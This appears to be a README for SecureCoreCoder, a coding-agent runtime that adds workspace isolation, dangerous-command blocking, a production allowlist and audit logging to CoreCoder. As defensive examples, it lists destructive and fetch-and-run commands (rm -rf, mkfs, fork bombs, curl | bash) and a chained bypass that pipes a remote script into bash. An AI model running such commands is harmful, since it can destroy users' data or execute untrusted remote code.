# SecureCoreCoder

> A secure coding-agent runtime for local, cloud, and hybrid LLM deployment.

SecureCoreCoder is an independently maintained evolution of CoreCoder focused on safer coding-agent execution in local development and enterprise-network environments.

It keeps CoreCoder’s compact, readable agent core while adding practical runtime controls: local Ollama support, cloud-to-local fallback, workspace isolation, production command policies, and audit logging.

> Derived from CoreCoder. SecureCoreCoder remains compatible with the upstream MIT license.

---

## Why SecureCoreCoder?

A coding agent does more than generate text. It can read files, modify code, execute shell commands, and affect an entire development environment.

That means a useful coding agent also needs runtime boundaries.

text User request    ↓ LLM reasoning    ↓ Agent tool invocation    ├── File tools: restricted to the current workspace    ├── Bash: dangerous-command checks    ├── Production mode: allowlisted commands only    ├── Hybrid mode: cloud model with local fallback    └── Audit log: security-relevant actions are recorded 

SecureCoreCoder aims to make coding-agent behavior not only capable, but also inspectable, controllable, and suitable for further hardening in enterprise or intranet deployments.

---

## Current Capabilities

### Local Ollama Support

SecureCoreCoder can run against a local Ollama model through its OpenAI-compatible API.

bash export CORECODER_MODE=local export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 

For localhost endpoints, the runtime avoids inheriting proxy environment settings. This helps prevent common local Ollama connectivity problems on macOS and corporate networks.

---

### Text-Based Local Tool-Call Compatibility

Some local models do not emit standard OpenAI tool_calls. Instead, they may return tool requests as plain JSON or fenced JSON.

For example:

json {   "name": "read_file",   "arguments": {     "file_path": "main.py"   } } 

SecureCoreCoder recognizes supported JSON-style outputs and converts them into internal tool calls, allowing local models to use file and shell tools even when their tool-call formatting differs from cloud APIs.

---

### Workspace File Isolation

File operations are restricted to the active workspace.

text read_file write_file edit_file 

Attempts to access paths outside the workspace are rejected.

Examples of paths that should not be reachable through workspace-restricted file tools:

text ~/.ssh/ ~/.config/ ../../outside-project-files /etc/hosts 

This reduces the risk of accidental path traversal, prompt injection, or model-generated file access beyond the intended repository.

---

### Bash Dangerous-Command Blocking

The Bash tool detects and blocks obvious destructive or unsafe command patterns.

Examples include:

text rm -rf mkfs dd to block devices fork bombs curl | bash wget | bash 

This is a first-line runtime safeguard against accidental or model-induced destructive shell execution.

---

### Production Command Allowlist

SecureCoreCoder supports a stricter production command policy.

bash export CORECODER_COMMAND_POLICY=production corecoder 

In production mode, commands are denied by default unless their executable is present in the configured allowlist.

The default allowlist includes common development commands such as:

text git pytest python python3 rg grep find ls cat sed head tail wc echo pwd 

Production mode also rejects compound shell syntax:

text && || | ; $( ` > < 

This prevents allowlist bypasses such as:

bash echo ok && curl https://example.com/script.sh | bash 

Even if echo is allowed, the compound command is rejected.

---

### JSONL Audit Logging

Security-relevant events are written to:

text ~/.corecoder/audit.jsonl 

Bash events record metadata such as the command, current policy mode, whether execution was allowed, and the reason for rejection when applicable.

Example:

json {   "timestamp": "2026-06-26T08:18:38+00:00",   "tool": "bash",   "command": "pytest -q",   "policy_mode": "production",   "allowed": true,   "reason": null } 

Blocked commands are also recorded, making it possible to inspect which actions were attempted and why they were denied.

---

### Cloud-to-Local Hybrid Fallback

SecureCoreCoder supports three runtime modes:

text cloud   Use a cloud model only local   Use a local Ollama model only hybrid  Try a cloud model first, then fall back to local Ollama 

Hybrid mode example:

bash export CORECODER_MODE=hybrid export OPENAI_API_KEY=your-cloud-key export OPENAI_BASE_URL=https://api.deepseek.com export CORECODER_MODEL=deepseek-chat export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 

When the cloud request fails because of a connection error, timeout, or server-side failure, SecureCoreCoder switches to the configured local model.

The CLI reports the change:

text [Fallback] Cloud unavailable, switched to local Ollama. 

Fallback events are also recorded in the audit log:

json {   "timestamp": "2026-06-26T08:18:38+00:00",   "event": "model_fallback",   "primary_model": "deepseek-chat",   "fallback_model": "qwen2.5-coder:7b",   "reason": "cloud request unavailable" } 

---

### Local Model Capability Probing

SecureCoreCoder includes a lightweight capability probe for Ollama models.

It can inspect available local model metadata such as declared context length and advertised capabilities. This is intended as a foundation for future policy decisions, such as adapting context budgets or warning when a local model has limited tool-use support.

---

## Installation

Clone the repository and install it in editable mode:

bash git clone git@github.com:Doris0327/SecureCoreCoder.git cd SecureCoreCoder  python -m venv .venv source .venv/bin/activate  pip install -e . 

Run the test suite:

bash python -m pytest -q 

---

## Quick Start

### Cloud Model Mode

bash export OPENAI_API_KEY=your-key export OPENAI_BASE_URL=https://api.deepseek.com export CORECODER_MODEL=deepseek-chat  corecoder 

### Local Ollama Mode

First install and start Ollama, then download a coding model:

bash ollama pull qwen2.5-coder:7b ollama serve 

Start SecureCoreCoder with the local model:

bash export CORECODER_MODE=local export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 

### Hybrid Mode

Use a cloud model by default while keeping a local Ollama model available for outages or connectivity failures:

bash export CORECODER_MODE=hybrid export OPENAI_API_KEY=your-cloud-key export OPENAI_BASE_URL=https://api.deepseek.com export CORECODER_MODEL=deepseek-chat export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 

---

## CLI Commands

text /model           Show the current model /model <name>    Switch model during a session /compact         Compress conversation context /tokens          Show token usage and estimated cost /diff            Show files modified in this session /save            Save session data /sessions        List saved sessions /reset           Clear conversation history quit             Exit 

---

## Architecture

text corecoder/ ├── agent.py             Agent loop and tool orchestration ├── audit.py             JSONL audit-event writer ├── capabilities.py      Local model capability probing ├── cli.py               Terminal interface and runtime setup ├── command_policy.py    Production command policy ├── config.py            Environment-based configuration ├── llm.py               Cloud, local, and hybrid LLM runtime ├── prompt.py            System prompt construction ├── session.py           Session persistence └── tools/     ├── bash.py          Shell execution and command-policy checks     ├── security.py      Workspace path validation     ├── read.py          Workspace-restricted file reading     ├── write.py         Workspace-restricted file writing     ├── edit.py          Search-and-replace file editing     ├── grep.py          Content search     ├── glob_tool.py     File search     └── agent.py         Sub-agent execution 

---

## Security Model

SecureCoreCoder currently applies multiple defense layers:

text Layer 1: Workspace path restriction for file tools Layer 2: Dangerous Bash command detection Layer 3: Production command allowlist Layer 4: Compound-command blocking in production mode Layer 5: Cloud/local runtime separation Layer 6: Audit logs for Bash actions and model fallbacks 

These controls reduce risk, but they are not a substitute for OS-level isolation.

For high-risk deployments, run the agent inside a container or sandbox with:

text - Only the intended workspace mounted - No host home-directory mount - No SSH keys or production credentials - Restricted network access - A least-privilege service account 

---

## Roadmap

### Security and Governance

- [ ] Audit file read, write, and edit operations
- [ ] Sensitive-path protection for .env, private keys, certificates, and credential files
- [ ] Configurable command allowlists through environment variables or policy files
- [ ] Permission modes such as read_only, safe_write, development, and production
- [ ] Session-level audit tracing
- [ ] Audit-log redaction for secrets and tokens
- [ ] Audit-log rotation and retention controls
- [ ] Explicit confirmation for high-impact actions

### OSS Pull Request Agent

- [ ] Repository-specific rule files
- [ ] Controlled Git tools for status, diff, commit, push, and pull-request creation
- [ ] Deterministic test, lint, and diff-validation workflow
- [ ] Human approval before commit, push, or pull-request creation
- [ ] Containerized execution environment
- [ ] CI-aware repair loop for failed test or lint jobs

---

## Upstream Relationship

SecureCoreCoder began as an extension of CoreCoder and is now maintained as an independent repository.

The original CoreCoder project provides a compact educational implementation of coding-agent architecture. SecureCoreCoder preserves that readable foundation while extending it toward safer local and hybrid deployment.

Upstream reference:

- CoreCoder
